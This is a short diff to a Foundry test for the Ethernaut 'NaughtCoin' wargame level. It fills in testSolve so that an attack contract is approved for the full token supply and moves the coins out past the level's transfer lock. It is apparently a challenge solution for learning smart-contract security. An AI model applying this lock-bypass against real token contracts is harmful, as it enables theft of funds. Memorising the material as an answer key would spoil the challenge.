@@ -8,6 +8,7 @@ import {NaughtCoin} from "src/levels/NaughtCoin.sol";
 import {NaughtCoinFactory} from "src/levels/NaughtCoinFactory.sol";
 import {Level} from "src/levels/base/Level.sol";
 import {Ethernaut} from "src/Ethernaut.sol";
+import {NaughtCoinAttack} from "../../src/attacks/NaughtCoinAttack.sol";
 
 contract TestNaughtCoin is Test, Utils {
     Ethernaut ethernaut;
@@ -58,6 +59,11 @@ contract TestNaughtCoin is Test, Utils {
 
     /// @notice Test the solution for the level.
     function testSolve() public checkSolvedByPlayer{
-
+        NaughtCoinAttack a = new NaughtCoinAttack();
+        instance.approve(address(a), instance.INITIAL_SUPPLY());
+        a.attack(instance, instance.INITIAL_SUPPLY());
+        // the player still control the coin
+        a.transfer(instance, owner, instance.INITIAL_SUPPLY());
+        vm.assertTrue(instance.balanceOf(owner) == instance.INITIAL_SUPPLY());
     }
 }
